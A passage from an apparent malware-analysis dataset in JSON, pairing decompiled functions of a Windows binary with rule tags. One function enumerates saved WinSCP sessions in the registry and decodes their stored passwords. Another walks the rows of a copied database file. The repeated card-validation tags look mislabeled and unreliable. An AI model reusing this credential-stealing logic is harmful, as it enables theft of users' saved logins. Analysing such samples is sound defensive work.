        "decompiled_code": "\nint32_t __fastcall fcn.00418c40(uint param_1)\n\n{\n    uint in_EAX;\n    uint arg_8h;\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.0042d6d0(in_EAX);\n    fcn.0042f700(arg_8h, param_1, in_EAX);\n    var_4h = param_1;\n    arg_8h_00 = fcn.0042d6d0(in_EAX);\n    iVar1 = (**0x457428)(&var_8h, 0, 0, 0, 0, 0, &var_10h);\n    if (iVar1 != 0) {\n        if (var_10h != 0) {\n            fcn.0042f700(arg_8h_00, var_ch, var_10h);\n        }\n        *(var_10h + arg_8h_00) = 0;\n        return arg_8h_00;\n    }\n    return 0;\n}\n",
        "token_count": 269
    },
    "00418e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418e20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t *in_FS_OFFSET;\n    uint uVar7;\n    uint arg_ch_00;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint *var_134h;\n    uint var_124h;\n    uint32_t var_120h;\n    uint var_118h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4418db;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00434d30(&var_118h, 0, 0x104, var_10h);\n    (**0x457520)(&var_118h, *0x457098);\n    puVar1 = fcn.0042d6d0(0x1a);\n    *puVar1 = 0;\n    uVar2 = (**0x45758c)();\n    fcn.0042f3d4(uVar2);\n    iVar6 = 0x1a;\n    do {\n        iVar3 = fcn.0042f3e6();\n        (**0x457374)(puVar1, 0x44fa74, puVar1, iVar3 % 10);\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    puVar1[0x1a] = 0;\n    (**0x457520)(&var_118h, puVar1);\n    uVar2 = 1;\n    (**0x4573c8)(var_13ch, &var_118h);\n    uVar7 = *0x456e98;\n    iVar6 = (**0x457344)(&var_118h, &var_140h);\n    if (iVar6 == 0) {\n        iVar6 = (**0x4572f8)(var_140h, uVar7, 0xffffffff, &var_138h, 0);\n        if (iVar6 == 0) {\n            iVar6 = (**0x457314)(var_138h);\n            while (iVar6 == 100) {\n                var_13ch = (**0x457334)(var_138h, 0);\n                uVar4 = (**0x457334)(var_138h, 1);\n                uVar7 = arg_ch;\n                arg_ch_00 = arg_10h;\n                (**0x457320)(var_138h, 2);\n                (**0x457328)(var_138h, 2);\n                fcn.00418cb0(uVar7, arg_ch_00);\n                var_4h = 0;\n                puVar5 = var_134h;\n                if (var_120h < 0x10) {\n                    puVar5 = &var_134h;\n                }\n                iVar6 = (**0x457550)(puVar5, 0x44c726);\n                if (iVar6 == 0) {\n                    iVar6 = (**0x457550)(uVar4, 0x44c726);\n                    if (iVar6 != 0) {\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        (**0x457520)();\n                        goto code_r0x00419155;\n                    }\n                }\n                else {\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\ncode_r0x00419155:\n                    (**0x457520)();\n                    (**0x457520)();\n                    (**0x457520)();\n                }\n                var_4h = 0xffffffff;\n                if (0xf < var_120h) {\n                    fcn.0042d62b(var_134h);\n                }\n                var_120h = 0xf;\n                var_124h = 0;\n                var_134h = var_134h & 0xffffff00;\n                iVar6 = (**0x457314)(var_138h);\n            }\n        }\n        (**0x457318)(var_138h);\n        (**0x457348)(var_140h);\n    }\n    (**0x457424)(&var_118h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(uVar2);\n    return;\n}\n",
        "token_count": 1185
    },
    "0041a1c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n\nvoid __cdecl fcn.0041a1c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_110h = arg_8h;\n    iVar1 = fcn.0042e323(0x457300);\n    if (iVar1 < 0x20) {\n        fcn.00434d30(&var_108h, 0, 0x104);\n        (**0x457520)(&var_108h);\n        (**0x457520)(&var_108h, 0x44c8cc);\n        (**0x457520)(&var_108h, *0x4572d0);\n        iVar1 = (**0x4573b4)(&var_108h, 0x80000000, 1, 0, 3, 0, 0);\n        var_10ch = iVar1;\n        if (iVar1 != 0) {\n            (**0x4573d0)(iVar1, 0, 0, 2);\n            iVar2 = (**0x457590)(iVar1, 0);\n            (**0x4573d0)(iVar1, 0, 0, 0);\n            var_114h = fcn.0042cbeb(iVar2 + 1);\n            (**0x4574dc)(iVar1, var_114h, iVar2, &var_118h, 0);\n            iVar2 = (**0x4573a0)(var_114h, *0x456bb4);\n            while (iVar2 != 0) {\n                iVar1 = (**0x457418)(*0x456bb4);\n                iVar1 = (**0x4573a0)(iVar2 + 3 + iVar1, *0x456e28);\n                *(iVar1 + -3) = 0;\n                (**0x457520)();\n                (**0x457520)();\n                (**0x457520)();\n                (**0x457520)();\n                (**0x457520)();\n                (**0x457520)();\n                (**0x457520)();\n                iVar1 = (**0x4573a0)(iVar1 + -2, *0x457074);\n                iVar2 = (**0x457418)(*0x457074);\n                iVar1 = (**0x4573a0)(iVar1 + 3 + iVar2, *0x457070);\n                *(iVar1 + -3) = 0;\n                (**0x457520)();\n                fcn.00418750();\n                (**0x457520)();\n                (**0x457520)();\n                iVar1 = (**0x4573a0)(iVar1 + -2, *0x457070);\n                iVar2 = (**0x457418)(*0x457070);\n                iVar1 = (**0x4573a0)(iVar1 + 3 + iVar2, *0x4571f4);\n                *(iVar1 + -3) = 0;\n                (**0x457520)();\n                fcn.00418750();\n                (**0x457520)();\n                (**0x457520)();\n                iVar2 = (**0x4573a0)(iVar1 + -2, *0x456bb4);\n                iVar1 = var_10ch;\n            }\n            (**0x4573b8)(iVar1);\n        }\n        (**0x45734c)();\n    }\n    fcn.0042d636(var_118h);\n    return;\n}\n",
        "token_count": 829
    },
    "0041ca60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041ca60(uchar *arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *arg_10h;\n    char *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint32_t var_80h;\n    uint var_70h;\n    uint32_t var_6ch;\n    uint32_t var_64h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441cb8;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_84h = 0;\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    arg_8h_00 = &var_84h;\n    var_4h = 1;\n    var_10h = uVar3;\n    iVar4 = fcn.0041c910(arg_8h_00);\n    uVar5 = (**0x45757c)(8, 0, arg_8h_00, uVar3);\n    iVar6 = (**0x457504)(uVar5);\n    if (iVar6 == 0) {\ncode_r0x0041cb0c:\n        if (var_84h != 0) {\n            uVar5 = (**0x45757c)(0, var_84h);\n            (**0x4575a8)(uVar5);\n        }\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        fcn.004090e0(0x44c726, 0);\n        if (0xf < var_18h) {\n            fcn.0042d62b(var_2ch);\n        }\n        var_18h = 0xf;\n        var_1ch = 0;\n        var_2ch = var_2ch & 0xffffff00;\n        if (0xf < var_34h) {\n            fcn.0042d62b(var_48h);\n        }\n    }\n    else {\n        fcn.0042dd9f(iVar6, 0, var_84h);\n        if (var_84h != 0) {\n            uVar5 = (**0x45757c)(0, var_84h);\n            (**0x4575a8)(uVar5);\n            var_84h = 0;\n        }\n        var_98h = iVar4;\n        if (iVar4 == 0xff) {\n            fcn.0041c910(&var_84h);\n            uVar5 = (**0x45757c)(0, iVar6);\n            (**0x4575a8)(uVar5);\n            uVar5 = (**0x45757c)(8, 0);\n            iVar6 = (**0x457504)(uVar5);\n            if (iVar6 == 0) goto code_r0x0041cb0c;\n            fcn.0042dd9f(iVar6, 0, var_84h);\n            if (var_84h != 0) {\n                uVar5 = (**0x45757c)(0, var_84h);\n                (**0x4575a8)(uVar5);\n                var_84h = 0;\n            }\n            var_98h = fcn.0041c910(&var_84h);\n            uVar5 = (**0x45757c)(0, iVar6);\n            (**0x4575a8)(uVar5);\n            uVar5 = (**0x45757c)(8, 0);\n            iVar6 = (**0x457504)(uVar5);\n            iVar7 = var_84h;\n            if (iVar6 == 0) {\n                if (var_84h != 0) {\n                    uVar5 = (**0x45757c)(0, var_84h);\n                    (**0x4575a8)(uVar5);\n                }\n                fcn.00408f20(0x44c726);\n                fcn.00408f80();\n                fcn.00408f80();\n                goto code_r0x0041d154;\n            }\n            fcn.0042dd9f(iVar6, 0, var_84h);\n            if (iVar7 != 0) {\n                uVar5 = (**0x45757c)(0, iVar7);\n                (**0x4575a8)(uVar5);\n                var_84h = 0;\n            }\n        }\n        iVar7 = fcn.0041c910(&var_84h);\n        uVar5 = (**0x45757c)(0, iVar6);\n        (**0x4575a8)(uVar5);\n        uVar5 = (**0x45757c)(8, 0);\n        iVar8 = (**0x457504)(uVar5);\n        iVar6 = var_84h;\n        if (iVar8 == 0) {\n            if (var_84h != 0) {\n                uVar5 = (**0x45757c)(0, var_84h);\n                (**0x4575a8)(uVar5);\n            }\n            *(arg_8h + 0x14) = 0xf;\n            *(arg_8h + 0x10) = 0;\n            *arg_8h = 0;\n            fcn.004090e0(0x44c726, 0);\n            if (0xf < var_18h) {\n                fcn.0042d62b(var_2ch);\n            }\n            var_18h = 0xf;\n            var_1ch = 0;\n            var_2ch = var_2ch & 0xffffff00;\n            if (0xf < var_34h) {\n                fcn.0042d62b(var_48h);\n            }\n        }\n        else {\n            fcn.0042dd9f(iVar8, 0, var_84h);\n            if (iVar6 != 0) {\n                uVar5 = (**0x45757c)(0, iVar6);\n                (**0x4575a8)(uVar5);\n            }\n            iVar6 = (**0x457418)(iVar8);\n            iVar6 = iVar6 + iVar7 * -2 + 1;\n            uVar5 = (**0x45757c)(8, iVar6);\n            var_84h = (**0x457504)(uVar5);\n            if (var_84h == 0) {\n                fcn.00408f20(0x44c726);\n                if (0xf < var_18h) {\n                    fcn.0042d62b(var_2ch);\n                }\n                var_18h = 0xf;\n                var_1ch = 0;\n                var_2ch = var_2ch & 0xffffff00;\n                if (0xf < var_34h) {\n                    fcn.0042d62b(var_48h);\n                }\n            }\n            else {\n                fcn.00408f20(iVar8);\n                var_4h = CONCAT31(var_4h._1_3_, 2);\n                uVar5 = (**0x457418)(iVar8);\n                arg_10h = fcn.00414960(uVar5);\n                iVar7 = var_84h;\n                if (0xf < arg_10h[5]) {\n                    arg_10h = *arg_10h;\n                }\n                fcn.0042dd9f(var_84h, iVar6, arg_10h);\n                if (0xf < var_6ch) {\n                    fcn.0042d62b(var_80h);\n                }\n                var_4h = CONCAT31(var_4h._1_3_, 1);\n                var_6ch = 0xf;\n                var_70h = 0;\n                var_80h = var_80h & 0xffffff00;\n                if (0xf < var_50h) {\n                    fcn.0042d62b(var_64h);\n                }\n                var_50h = 0xf;\n                var_54h = 0;\n                var_64h = var_64h & 0xffffff00;\n                uVar5 = (**0x45757c)(0, iVar8);\n                (**0x4575a8)(uVar5);\n                iVar6 = (**0x457418)(iVar7);\n                iVar6 = iVar6 + 1;\n                uVar5 = (**0x45757c)(8, iVar6);\n                iVar7 = (**0x457504)(uVar5);\n                if (iVar7 == 0) {\n                    uVar5 = (**0x45757c)(0, var_84h);\n                    (**0x4575a8)(uVar5);\n                    fcn.00408f20(0x44c726);\n                    fcn.00408f80();\n                    fcn.00408f80();\n                }\n                else {\n                    fcn.0042dd9f(iVar7, iVar6, var_84h);\n                    uVar5 = (**0x45757c)(0, var_84h);\n                    (**0x4575a8)(uVar5);\n                    var_84h = 0;\n                    var_90h = 0;\n                    if (0 < var_98h) {\n                        do {\n                            fcn.0041c910(&var_84h);\n                            uVar5 = (**0x45757c)(0, iVar7);\n                            (**0x4575a8)(uVar5);\n                            uVar5 = (**0x45757c)(8, iVar6);\n                            iVar7 = (**0x457504)(uVar5);\n                            iVar8 = var_84h;\n                            if (iVar7 == 0) {\n                                if (var_84h != 0) {\n                                    uVar5 = (**0x45757c)(0, var_84h);\n                                    (**0x4575a8)(uVar5);\n                                }\n                                fcn.00408f20(0x44c726);\n                                if (0xf < var_18h) {\n                                    fcn.0042d62b(var_2ch);\n                                }\n                                var_18h = 0xf;\n                                var_1ch = 0;\n                                var_2ch = var_2ch & 0xffffff00;\n                                if (0xf < var_34h) {\n                                    fcn.0042d62b(var_48h);\n                                }\n                                goto code_r0x0041d154;\n                            }\n                            fcn.0042dd9f(iVar7, iVar6, var_84h);\n                            if (iVar8 != 0) {\n                                uVar5 = (**0x45757c)(0, iVar8);\n                                (**0x4575a8)(uVar5);\n                                var_84h = 0;\n                            }\n                            fcn.00420080();\n                            var_90h = var_90h + 1;\n                        } while (var_90h < var_98h);\n                    }\n                    if (iVar4 == 0xff) {\n                        fcn.00408f20(arg_ch);\n                        var_4h._0_1_ = 3;\n                        fcn.00408ff0();\n                        var_4h._0_1_ = 1;\n                        if (0xf < var_50h) {\n                            fcn.0042d62b(var_64h);\n                        }\n                        pcVar1 = in_ECX + 1;\n                        do {\n                            cVar2 = *in_ECX;\n                            in_ECX = in_ECX + 1;\n                        } while (cVar2 != '\\0');\n                        fcn.00414cc0(in_ECX - pcVar1);\n                        fcn.00414960(var_38h);\n                        var_4h._0_1_ = 4;\n                        fcn.00408ff0();\n                        var_4h = CONCAT31(var_4h._1_3_, 1);\n                        if (0xf < var_50h) {\n                            fcn.0042d62b(var_64h);\n                        }\n                        var_50h = 0xf;\n                        var_54h = 0;\n                        var_64h = var_64h & 0xffffff00;\n                    }\n                    uVar5 = (**0x45757c)(0, iVar7);\n                    (**0x4575a8)(uVar5);\n                    *(arg_8h + 0x14) = 0xf;\n                    *(arg_8h + 0x10) = 0;\n                    *arg_8h = 0;\n                    fcn.00408ff0();\n                    if (0xf < var_18h) {\n                        fcn.0042d62b(var_2ch);\n                    }\n                    var_18h = 0xf;\n                    var_1ch = 0;\n                    var_2ch = var_2ch & 0xffffff00;\n                    if (0xf < var_34h) {\n                        fcn.0042d62b(var_48h);\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0041d154:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 3226
    },
    "0041d1e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041d1e0(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_df0h;\n    uint var_dech;\n    uint var_de8h;\n    uint var_de4h;\n    uint var_de0h;\n    uint var_ddch;\n    uint var_dd8h;\n    int32_t var_dd4h;\n    uint var_dd0h;\n    uint var_dcch;\n    char var_dc5h;\n    int32_t var_dc4h;\n    uint32_t var_dc0h;\n    uint var_db0h;\n    uint32_t var_dach;\n    uint32_t var_da4h;\n    uint var_d94h;\n    uint32_t var_d90h;\n    uint32_t var_d88h;\n    uint var_d78h;\n    uint32_t var_d74h;\n    uint32_t var_d6ch;\n    uint var_d5ch;\n    uint32_t var_d58h;\n    uint *var_d50h;\n    uint var_d40h;\n    uint32_t var_d3ch;\n    uint32_t var_d34h;\n    uint var_d24h;\n    uint32_t var_d20h;\n    uint var_d18h;\n    uint var_918h;\n    uint var_518h;\n    uchar var_118h;\n    uint var_117h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44265d;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_dd4h = 0;\n    var_118h = 0;\n    var_dd0h = param_1;\n    fcn.00434d30(&var_117h, 0, 0x103, var_10h);\n    var_dcch = 0x104;\n    fcn.00434d30(&var_918h, 0, 0x400);\n    fcn.00434d30(&var_518h, 0, 0x400);\n    fcn.00434d30(&var_d18h, 0, 0x400);\n    arg_8h = &var_dc4h;\n    var_ddch = 0x400;\n    var_de8h = 0x400;\n    var_dd8h = 0x400;\n    iVar2 = (**0x4575ac)(0x80000001, L\"Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Configuration\", 0, 1);\n    if (iVar2 != 0) goto code_r0x0041d7ed;\n    var_d74h = 0xf;\n    var_d78h = 0;\n    var_d88h = var_d88h & 0xffffff00;\n    pcVar3 = *0x4570c0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x4570c0, pcVar3 - (*0x4570c0 + 1));\n    var_4h = 0;\n    var_d58h = 0xf;\n    var_d5ch = 0;\n    var_d6ch = var_d6ch & 0xffffff00;\n    pcVar3 = *0x45729c;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x45729c, pcVar3 - (*0x45729c + 1));\n    var_4h._0_1_ = 1;\n    puVar4 = fcn.00424130(&var_d34h);\n    var_4h._0_1_ = 2;\n    puVar5 = fcn.00424130(&var_da4h);\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    if (7 < puVar5[5]) {\n        puVar5 = *puVar5;\n    }\n    iVar2 = (**0x457368)(var_dc4h, puVar5, puVar4, 0x10, 0, &var_de4h, &var_df0h);\n    var_dc5h = iVar2 != 0;\n    if (7 < var_d90h) {\n        fcn.0042d62b(var_da4h);\n    }\n    var_d90h = 7;\n    var_d94h = 0;\n    var_da4h = var_da4h & 0xffff0000;\n    if (7 < var_d20h) {\n        fcn.0042d62b(var_d34h);\n    }\n    var_d20h = 7;\n    var_d24h = 0;\n    var_d34h = var_d34h & 0xffff0000;\n    if (0xf < var_d58h) {\n        fcn.0042d62b(var_d6ch);\n    }\n    var_4h = 0xffffffff;\n    var_d58h = 0xf;\n    var_d5ch = 0;\n    var_d6ch = var_d6ch & 0xffffff00;\n    if (0xf < var_d74h) {\n        fcn.0042d62b(var_d88h);\n    }\n    var_d74h = 0xf;\n    var_d78h = 0;\n    var_d88h = var_d88h & 0xffffff00;\n    if (var_dc5h == '\\0') {\ncode_r0x0041d484:\n        if (var_dc4h != 0) {\n            (**0x4574d0)(var_dc4h);\n            var_dc4h = 0;\n        }\n    }\n    else if (var_dc4h != 0) {\n        (**0x4574d0)(var_dc4h);\n        var_dc4h = 0;\n        goto code_r0x0041d484;\n    }\n    iVar2 = (**0x4575ac)(0x80000001, L\"Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\", 0, 9, &var_dc4h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x457574)(var_dc4h, 0, &var_118h, &var_dcch, 0, 0, 0, 0);\n        if (iVar2 == 0) {\n            do {\n                (**0x457520)(param_1, 0x44c738);\n                (**0x457520)(param_1, *0x456c3c);\n                (**0x457520)(param_1, 0x44c738);\n                (**0x457520)(param_1, *0x4571e0);\n                (**0x457408)(var_dc4h, &var_118h, *0x456b9c, 2, 0, &var_918h, &var_ddch);\n                (**0x457520)(param_1, &var_918h);\n                var_de0h = 4;\n                iVar2 = (**0x457408)(var_dc4h, &var_118h, *0x456d00, 0xffff, 0, &var_dech, &var_de0h);\n                if (iVar2 == 0) {\n                    puVar4 = fcn.00423ec0(var_dech);\n                    var_4h = 4;\n                    if (0xf < puVar4[5]) {\n                        puVar4 = *puVar4;\n                    }\n                    (**0x457520)(param_1, puVar4);\n                    var_4h = 0xffffffff;\n                    if (0xf < var_d20h) {\n                        fcn.0042d62b(var_d34h);\n                    }\n                    var_d20h = 0xf;\n                    var_d24h = 0;\n                    var_d34h = var_d34h & 0xffffff00;\n                }\n                else {\n                    (**0x457520)(param_1, 0x44f13c);\n                }\n                (**0x457520)(param_1, 0x44c738);\n                (**0x457520)(param_1, *0x456c9c);\n                (**0x457408)(var_dc4h, &var_118h, *0x457264, 2, 0, &var_518h, &var_de8h);\n                (**0x457520)(param_1, &var_518h);\n                var_d3ch = 0xf;\n                var_d40h = 0;\n                var_d50h = var_d50h & 0xffffff00;\n                var_4h = 5;\n                (**0x457408)(var_dc4h, &var_118h, *0x456e2c, 2, 0, &var_d18h, &var_dd8h);\n                (**0x457520)(param_1, 0x44c738);\n                (**0x457520)(param_1, *0x45719c);\n                iVar2 = (**0x457550)(&var_d18h, 0x44c726);\n                if (iVar2 != 0) {\n                    fcn.0041ca60(&var_dc0h, &var_918h);\n                    var_4h._0_1_ = 6;\n                    fcn.00408ff0();\n                    var_4h = CONCAT31(var_4h._1_3_, 5);\n                    if (0xf < var_dach) {\n                        fcn.0042d62b(var_dc0h);\n                    }\n                    var_dach = 0xf;\n                    var_db0h = 0;\n                    var_dc0h = var_dc0h & 0xffffff00;\n                    puVar4 = var_d50h;\n                    if (var_d3ch < 0x10) {\n                        puVar4 = &var_d50h;\n                    }\n                    (**0x457520)(var_dd0h, puVar4);\n                    param_1 = var_dd0h;\n                }\n                (**0x457520)(param_1, 0x44ed2c);\n                var_dd4h = var_dd4h + 1;\n                var_dcch = 0x104;\n                iVar2 = (**0x457574)(var_dc4h, var_dd4h, &var_118h, &var_dcch, 0, 0, 0, 0);\n                var_4h = 0xffffffff;\n                if (0xf < var_d3ch) {\n                    fcn.0042d62b(var_d50h);\n                }\n                var_d3ch = 0xf;\n                var_d40h = 0;\n                var_d50h = var_d50h & 0xffffff00;\n            } while (iVar2 != 0x103);\n        }\n        if (var_dc4h != 0) {\n            (**0x4574d0)(var_dc4h);\n        }\n    }\ncode_r0x0041d7ed:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 2616
    },
    "0041f480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041f480(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0042ddfe(0x20);\n    iVar1 = fcn.00404c20(arg_8h_00);\n    if ((iVar1 == 0) && (arg_8h_00 != 0)) {\n        *0x4572f8 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        *0x457314 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        *0x457348 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        *0x457334 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        *0x457328 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        *0x457344 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        *0x457320 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        *0x457318 = fcn.00404da0(*(arg_8h_00 + 0x14));\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 346
    },
    "00421370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00421370(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x54) != 0) {\n        cVar2 = fcn.004214a0();\n        iVar4 = in_EAX;\n        if (cVar2 == '\\0') {\n            iVar4 = 0;\n        }\n        iVar3 = fcn.0042f172(*(in_EAX + 0x54));\n        if (iVar3 == 0) goto code_r0x0042139b;\n    }\n    iVar4 = 0;\ncode_r0x0042139b:\n    *(in_EAX + 0x10) = in_EAX + 8;\n    *(in_EAX + 0x50) = 0;\n    *(in_EAX + 0x49) = 0;\n    *(in_EAX + 0x20) = in_EAX + 0x18;\n    *(in_EAX + 0x24) = in_EAX + 0x1c;\n    *(in_EAX + 0x14) = in_EAX + 0xc;\n    *(in_EAX + 0x30) = in_EAX + 0x28;\n    *(in_EAX + 0x34) = in_EAX + 0x2c;\n    *(in_EAX + 0xc) = 0;\n    **(in_EAX + 0x24) = 0;\n    **(in_EAX + 0x34) = 0;\n    **(in_EAX + 0x10) = 0;\n    uVar1 = *0x457818;\n    **(in_EAX + 0x20) = 0;\n    **(in_EAX + 0x30) = 0;\n    *(in_EAX + 0x54) = 0;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 0x4c) = uVar1;\n    return iVar4;\n}\n",
        "token_count": 477
    },
    "00421670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00421670(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    \n    iVar2 = **(in_EAX + 0x10);\n    iVar1 = in_EAX + 0x48;\n    if (iVar2 != iVar1) {\n        *(in_EAX + 0x3c) = iVar2;\n        *(in_EAX + 0x40) = **(in_EAX + 0x30) + **(in_EAX + 0x20);\n    }\n    **(in_EAX + 0x10) = iVar1;\n    **(in_EAX + 0x20) = iVar1;\n    **(in_EAX + 0x30) = (in_EAX - iVar1) + 0x49;\n    return;\n}\n",
        "token_count": 188
    },
    "00421970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00421970(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441c50;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    if (0x9249249 < var_8h) {\n        fcn.0042cb30(\"vector<T> too long\");\n    }\n    if ((param_1[2] - *param_1) / 0x1c < var_8h) {\n        arg_ch = fcn.00421a80();\n        var_4h = 0;\n        fcn.00421ff0(param_1[1], arg_ch);\n        iVar1 = *param_1;\n        iVar2 = param_1[1];\n        if (iVar1 != 0) {\n            fcn.00417240();\n            fcn.0042d62b(*param_1);\n        }\n        param_1[2] = arg_ch + var_8h * 0x1c;\n        param_1[1] = arg_ch + ((iVar2 - iVar1) / 0x1c) * 0x1c;\n        *param_1 = arg_ch;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 384
    },
    "00421a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421a80(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    code *var_10h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if (param_1 != 0) {\n        if ((param_1 < 0x924924a) && (iVar1 = fcn.0042ddfe(param_1 * 0x1c),  iVar1 != 0)) {\n            return iVar1;\n        }\n        var_4h = 0;\n        fcn.0042d7ec(&var_4h);\n        var_10h = vtable.std::bad_alloc.0;\n        iVar1 = fcn.0042f5f6(&var_10h, 0x4510e8);\n    }\n    return iVar1;\n}\n",
        "token_count": 187
    },
    "00421ff0": {
        "rules": [
